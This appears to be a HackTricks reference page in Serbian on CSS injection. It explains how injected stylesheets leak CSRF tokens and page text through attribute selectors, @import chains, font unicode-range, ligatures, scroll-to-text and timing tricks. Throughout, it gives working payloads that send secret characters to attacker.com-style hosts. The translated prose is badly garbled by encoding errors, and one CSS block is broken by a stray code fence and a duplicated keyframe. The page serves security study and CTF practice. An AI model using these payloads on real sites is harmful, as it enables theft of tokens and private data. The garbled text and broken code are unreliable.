# CSS Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## CSS Injection

### Selektor atributa

CSS selektori su oblikovani da se podudaraju sa vrednostima `name` i `value` atributa `input` elementa. Ako vrednost atributa `value` input elementa poÄinje sa odreÄ‘enim karakterom, uÄitava se unapred definisani spoljni resurs:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
#### Bypass za Skrivene Elemente

Da biste zaobiÅ¡li ovu ograniÄenost, moÅ¾ete ciljati sledeÄ‡i susedni element koristeÄ‡i `~` kombinator za opÅ¡te susede. Zatim se CSS pravilo primenjuje na sve susede koji slede nakon skrivenog input elementa, Å¡to uzrokuje uÄitavanje pozadinske slike:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
#### Preduslovi za CSS ubacivanje

Da bi tehnika CSS ubacivanja bila efikasna, moraju biti ispunjeni odreÄ‘eni uslovi:

1. **DuÅ¾ina Payload-a**: Vektor CSS ubacivanja mora podrÅ¾avati dovoljno dugaÄke payload-e da bi mogao da smesti oblikovane selektore.
2. **Ponovno ocenjivanje CSS-a**: Trebalo bi da imate moguÄ‡nost da okvirno postavite stranicu, Å¡to je neophodno da bi se pokrenulo ponovno ocenjivanje CSS-a sa novim generisanim payload-ima.
3. **Spoljni Resursi**: Tehnika pretpostavlja moguÄ‡nost koriÅ¡Ä‡enja slika hostovanih spolja. Ovo moÅ¾e biti ograniÄeno politikom bezbednosti sadrÅ¾aja (CSP) sajta.

### Slepi selektor atributa

Kao Å¡to je [**objaÅ¡njeno u ovom postu**](https://portswigger.net/research/blind-css-exfiltration), moguÄ‡e je kombinovati selektore **`:has`** i **`:not`** kako bi se identifikovao sadrÅ¾aj Äak i iz slepih elemenata. Ovo je veoma korisno kada nemate pojma Å¡ta se nalazi unutar web stranice koja uÄitava CSS ubacivanje.\
TakoÄ‘e je moguÄ‡e koristiti ove selektore kako bi se izvukle informacije iz nekoliko blokova istog tipa kao u:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Kombinovanjem ove tehnike sa sledeÄ‡om **@import** tehnikom, moguÄ‡e je eksfiltrirati puno **informacija koriÅ¡Ä‡enjem CSS ubacivanja sa slepih stranica pomoÄ‡u** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Prethodna tehnika ima neke nedostatke, proverite preduslove. Morate ili biti u moguÄ‡nosti da **poÅ¡aljete viÅ¡e linkova Å¾rtvi**, ili morate biti u moguÄ‡nosti da **ubacite iframe na stranicu sa ranjivoÅ¡Ä‡u CSS ubacivanja**.

MeÄ‘utim, postoji joÅ¡ jedna pametna tehnika koja koristi **CSS `@import`** da poboljÅ¡a kvalitet tehnike.

Ovo je prvi put pokazao [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) i radi na sledeÄ‡i naÄin:

Umesto uÄitavanja iste stranice iznova i iznova sa desetinama razliÄitih payloada svaki put (kao u prethodnoj tehnici), mi Ä‡emo **uÄitati stranicu samo jednom i samo sa importom ka serveru napadaÄa** (ovo je payload koji se Å¡alje Å¾rtvi):
```css
@import url('//attacker.com:5001/start?');
```
1. Uvoz Ä‡e **primiti odreÄ‘eni CSS skript** od napadaÄa i **pregledaÄ Ä‡e ga uÄitati**.
2. Prvi deo CSS skripta koji Ä‡e napadaÄ poslati je **joÅ¡ jedan `@import` ka serveru napadaÄa ponovo**.
3. Server napadaÄa joÅ¡ uvek neÄ‡e odgovoriti na ovaj zahtev, jer Å¾elimo da procuri nekoliko karaktera, a zatim odgovoriti na ovaj uvoz sa payloadom kako bi procurili sledeÄ‡e.
4. Drugi i veÄ‡i deo payloada Ä‡e biti **payload za curenje atributa selektora**.
5. Ovo Ä‡e poslati serveru napadaÄa **prvi karakter tajne i poslednji karakter**.
6. Kada server napadaÄa primi **prvi i poslednji karakter tajne**, odgovoriÄ‡e na uvoz koji je zatraÅ¾en u koraku 2.
7. Odgovor Ä‡e biti taÄno isti kao **koraci 2, 3 i 4**, ali ovog puta Ä‡e pokuÅ¡ati **pronaÄ‡i drugi karakter tajne i zatim predposlednji**.

NapadaÄ Ä‡e **pratiti ovu petlju dok ne uspe potpuno da procuri tajnu**.

Originalni [**Pepe Vila kod za iskoriÅ¡Ä‡avanje ovoga moÅ¾ete pronaÄ‡i ovde**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ili moÅ¾ete pronaÄ‡i skoro [**isti kod ali komentiran ovde**.](./#css-injection)

{% hint style="info" %}
Skripta Ä‡e pokuÅ¡ati da otkrije 2 karaktera svaki put (od poÄetka i od kraja) jer atribut selektora omoguÄ‡ava stvari poput:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Ovo omoguÄ‡ava skripti da brÅ¾e otkrije tajnu.
{% endhint %}

{% hint style="warning" %}
Ponekad skripta **ne detektuje taÄno da je prefiks + sufiks koji je otkriven veÄ‡ kompletan flag** i nastaviÄ‡e dalje (u prefiksu) i unazad (u sufiksu) i u nekom trenutku Ä‡e se zablokirati.\
Ne brinite, samo proverite **izlaz** jer **moÅ¾ete videti flag tamo**.
{% endhint %}

### Ostali selektori

Drugi naÄini pristupa delovima DOM-a pomoÄ‡u **CSS selektora**:

* **`.class-to-search:nth-child(2)`**: Ovo Ä‡e pronaÄ‡i drugu stavku sa klasom "class-to-search" u DOM-u.
*   **`:empty`** selektor: KoriÅ¡Ä‡en je na primer u [**ovom writeup-u**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search zasnovan na greÅ¡kama

**Reference:** [CSS based Attack: Zloupotreba unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

OpÅ¡ti cilj je **koristiti prilagoÄ‘eni font sa kontrolisane taÄke** i osigurati da se **tekst (u ovom sluÄaju, 'A') prikaÅ¾e samo ovim fontom ako odreÄ‘eni resurs (`favicon.ico`) ne moÅ¾e da se uÄita**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **KoriÅ¡Ä‡enje prilagoÄ‘enog fonta**:
   - PrilagoÄ‘eni font se definiÅ¡e koriÅ¡Ä‡enjem pravila `@font-face` unutar `<style>` oznake u delu `<head>`.
   - Font je nazvan `poc` i preuzima se sa spoljnog endpointa (`http://attacker.com/?leak`).
   - Svojstvo `unicode-range` je postavljeno na `U+0041`, ciljajuÄ‡i specifiÄan Unicode karakter 'A'.

2. **Element objekta sa rezervnim tekstom**:
   - Element `<object>` sa `id="poc0"` je kreiran u delu `<body>`. Ovaj element pokuÅ¡ava da uÄita resurs sa adrese `http://192.168.0.1/favicon.ico`.
   - `font-family` za ovaj element je postavljen na `'poc'`, kako je definisano u delu `<style>`.
   - Ako resurs (`favicon.ico`) ne uspe da se uÄita, rezervisani sadrÅ¾aj (slovo 'A') unutar `<object>` oznake Ä‡e biti prikazan.
   - Rezervisani sadrÅ¾aj ('A') Ä‡e biti prikazan koriÅ¡Ä‡enjem prilagoÄ‘enog fonta `poc` ako spoljni resurs ne moÅ¾e da se uÄita.

### Stilizovanje fragmenta teksta za skrolovanje

**`:target`** pseudo-klasa se koristi za odabir elementa ciljanog putem **URL fragmenta**, kako je navedeno u [specifikaciji CSS selektora nivoa 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). VaÅ¾no je razumeti da `::target-text` ne odgovara nijednom elementu osim ako tekst nije eksplicitno ciljan fragmentom.

Bezbednosna zabrinutost se javlja kada napadaÄi iskoriÅ¡Ä‡avaju moguÄ‡nost **Skrolovanja do teksta**, omoguÄ‡avajuÄ‡i im da potvrde prisustvo odreÄ‘enog teksta na veb stranici uÄitavanjem resursa sa svojeg servera putem HTML ubacivanja. Metoda ukljuÄuje ubacivanje CSS pravila poput ovog:
```css
:target::before { content : url(target.png) }
```
U ovakvim scenarijima, ako je tekst "Administrator" prisutan na stranici, resurs `target.png` se zahteva sa servera, Å¡to ukazuje na prisustvo teksta. Primer ovog napada moÅ¾e se izvrÅ¡iti putem posebno oblikovanog URL-a koji ugraÄ‘uje ubaÄeni CSS zajedno sa fragmentom za skrolovanje do teksta:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Ovde napad manipuliÅ¡e HTML ubacivanjem kako bi preneo CSS kod, ciljajuÄ‡i specifiÄan tekst "Administrator" kroz Scroll-to-text fragment (`#:~:text=Administrator`). Ako se tekst pronaÄ‘e, naznaÄeni resurs se uÄitava, nenamerno signalizirajuÄ‡i svoje prisustvo napadaÄu.

Za ublaÅ¾avanje, treba imati na umu sledeÄ‡e taÄke:

1. **OgraniÄeno podudaranje STTF-a**: Scroll-to-text Fragment (STTF) je dizajniran da se podudara samo sa reÄima ili reÄenicama, Äime se ograniÄava njegova sposobnost da otkrije proizvoljne tajne ili tokene.
2. **OgraniÄenje na kontekste pregledanja najviÅ¡eg nivoa**: STTF funkcioniÅ¡e iskljuÄivo u kontekstima pregledanja najviÅ¡eg nivoa i ne funkcioniÅ¡e unutar iframes-a, Äime se svaki pokuÅ¡aj eksploatacije Äini primetnijim korisniku.
3. **Potreba za aktivacijom korisnika**: STTF zahteva gest aktivacije korisnika da bi funkcionisao, Å¡to znaÄi da su eksploatacije izvodljive samo putem navigacija koje je inicirao korisnik. Ovaj zahtev znaÄajno umanjuje rizik od automatizacije napada bez interakcije korisnika. Ipak, autor blog posta ukazuje na specifiÄne uslove i zaobilaze (npr. socijalno inÅ¾enjerstvo, interakcija sa rasprostranjenim ekstenzijama pregledaÄa) koji bi mogli olakÅ¡ati automatizaciju napada.

Svest o ovim mehanizmima i potencijalnim ranjivostima kljuÄna je za odrÅ¾avanje bezbednosti veba i zaÅ¡tite od takvih eksploatativnih taktika.

Za viÅ¡e informacija pogledajte originalni izveÅ¡taj: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

MoÅ¾ete proveriti [**eksploit koji koristi ovu tehniku za CTF ovde**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

MoÅ¾ete specificirati **spoljne fontove za specifiÄne Unicode vrednosti** koje Ä‡e biti **prikupljene samo ako su te Unicode vrednosti prisutne** na stranici. Na primer:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Kada pristupite ovoj stranici, Chrome i Firefox dohvaÄ‡aju "?A" i "?B" jer tekstni Ävor sensitive-information sadrÅ¾i karaktere "A" i "B". MeÄ‘utim, Chrome i Firefox ne dohvaÄ‡aju "?C" jer ne sadrÅ¾i "C". To znaÄi da smo uspeli da proÄitamo "A" i "B".

### IzvlaÄenje teksta iz Ävora (I): ligature <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Reference:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Tehnika opisana ukljuÄuje izvlaÄenje teksta iz Ävora iskoriÅ¡Ä‡avanjem font ligatura i praÄ‡enje promena u Å¡irini. Proces ukljuÄuje nekoliko koraka:

1. **Kreiranje prilagoÄ‘enih fontova**:
- SVG fontovi se oblikuju sa glifovima koji imaju atribut `horiz-adv-x`, koji postavlja veliku Å¡irinu za glif koji predstavlja sekvencu od dva karaktera.
- Primer SVG glifa: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, gde "XY" oznaÄava sekvencu od dva karaktera.
- Ovi fontovi se zatim konvertuju u woff format koristeÄ‡i fontforge.

2. **Detekcija promena u Å¡irini**:
- CSS se koristi kako bi se osiguralo da tekst ne prelazi u novi red (`white-space: nowrap`) i kako bi se prilagodio stil trake za pomeranje.
- Pojava horizontalne trake za pomeranje, stilizovane na poseban naÄin, deluje kao indikator (orakul) da je odreÄ‘ena ligatura, a time i odreÄ‘ena sekvencija karaktera, prisutna u tekstu.
- UkljuÄeni CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Proces eksploatacije**:
- **Korak 1**: Fontovi se kreiraju za parove karaktera sa znaÄajnom Å¡irinom.
- **Korak 2**: Koristi se trik sa trakom za pomeranje kako bi se detektovalo kada je veliki glif Å¡irine (ligatura za par karaktera) prikazan, Å¡to ukazuje na prisustvo sekvence karaktera.
- **Korak 3**: Nakon detekcije ligature, generiÅ¡u se novi glifovi koji predstavljaju sekvence od tri karaktera, ukljuÄujuÄ‡i detektovani par i dodavanje prethodnog ili sledeÄ‡eg karaktera.
- **Korak 4**: Sprovodi se detekcija trokarakternih ligatura.
- **Korak 5**: Proces se ponavlja, postepeno otkrivajuÄ‡i ceo tekst.

4. **Optimizacija**:
- Trenutna metoda inicijalizacije koriÅ¡Ä‡enjem `<meta refresh=...` nije optimalna.
- Efikasniji pristup mogao bi ukljuÄivati trik sa CSS `@import`, poboljÅ¡avajuÄ‡i performanse eksploatacije.

### IzvlaÄenje teksta iz Ävora (II): otkrivanje karakterskog skupa sa podrazumevanim fontom (bez potrebe za spoljnim resursima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** [PoC koriÅ¡Ä‡enjem Comic Sans od strane @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ovaj trik je objavljen u ovom [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Karakterski skup koriÅ¡Ä‡en u tekstnom Ävoru moÅ¾e biti otkriven **koriÅ¡Ä‡enjem podrazumevanih fontova** instaliranih u pretraÅ¾ivaÄu: nisu potrebni spoljni -ili prilagoÄ‘eni- fontovi.

Koncept se zasniva na koriÅ¡Ä‡enju animacije kako bi se postepeno proÅ¡irila Å¡irina `div`-a, omoguÄ‡avajuÄ‡i da se po jedan karakter prebaci iz 'sufiksa' teksta u 'prefiks'. Ovaj proces efikasno deli tekst na dva dela:

1. **Prefiks**: PoÄetna linija.
2. **Sufiks**: Naredne linije.

Faze tranzicije karaktera bi izgledale ovako:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Tokom ove tranzicije, **unicode-range trik** se koristi kako bi se identifikovao svaki novi karakter dok se pridruÅ¾uje prefiksu. To se postiÅ¾e prebacivanjem fonta na Comic Sans, koji je primetno viÅ¡i od podrazumevanog fonta, Å¡to poslediÄno pokreÄ‡e vertikalnu traku za pomeranje. Pojava ove trake za pomeranje indirektno otkriva prisustvo novog karaktera u prefiksu.

Iako ovaj metod omoguÄ‡ava detekciju jedinstvenih karaktera kako se pojavljuju, ne precizira koji se karakter ponavlja, samo da se ponavljanje desilo.

{% hint style="info" %}
U osnovi, **unicode-range se koristi za otkrivanje karaktera**, ali kako ne Å¾elimo da uÄitavamo spoljni font, moramo pronaÄ‡i drugi naÄin.\
Kada se **karakter pronaÄ‘e**, dodeljuje mu se prethodno instaliran **Comic Sans font**, koji ga **uveÄ‡ava** i **pokreÄ‡e traku za pomeranje** koja Ä‡e **otkriti pronaÄ‘eni karakter**.
{% endhint %}

Proverite kod izdvojen iz PoC-a:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
```css
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### IzloÅ¾enost teksta Ävora (III): otkrivanje skupa znakova pomoÄ‡u keÅ¡iranja vremena (bez potrebe za spoljnim sredstvima) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom izveÅ¡taju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju, moÅ¾emo pokuÅ¡ati da otkrijemo da li se znak nalazi u tekstu uÄitavanjem laÅ¾nog fonta sa istog izvora:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Ako postoji podudaranje, **font Ä‡e biti uÄitan sa `/static/bootstrap.min.css?q=1`**. Iako se neÄ‡e uspeÅ¡no uÄitati, **pregledaÄ bi trebalo da ga keÅ¡ira**, i Äak ako nema keÅ¡a, postoji mehanizam **304 not modified**, tako da bi **odgovor trebao biti brÅ¾i** od drugih stvari.

MeÄ‘utim, ako vremenska razlika izmeÄ‘u keÅ¡iranog odgovora i nekeÅ¡iranog nije dovoljno velika, ovo neÄ‡e biti korisno. Na primer, autor je pomenuo: MeÄ‘utim, nakon testiranja, otkrio sam da je prvi problem to Å¡to brzina nije mnogo drugaÄija, a drugi problem je Å¡to bot koristi zastavicu `disk-cache-size=1`, Å¡to je zaista promiÅ¡ljeno.

### Exfiltracija teksta putem Ävorova (III): otkrivanje karakterskog skupa merenjem vremena uÄitavanja stotina lokalnih "fontova" (ne zahteva spoljne resurse) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Reference:** Ovo je pomenuto kao [neuspeÅ¡no reÅ¡enje u ovom izveÅ¡taju](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

U ovom sluÄaju moÅ¾ete naznaÄiti **CSS da uÄita stotine laÅ¾nih fontova** sa istog porekla kada se dogodi podudaranje. Na ovaj naÄin moÅ¾ete **meriti vreme** koje je potrebno i saznati da li se karakter pojavljuje ili ne sa neÄim poput:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
I kod bota izgleda ovako:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
## Reference

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
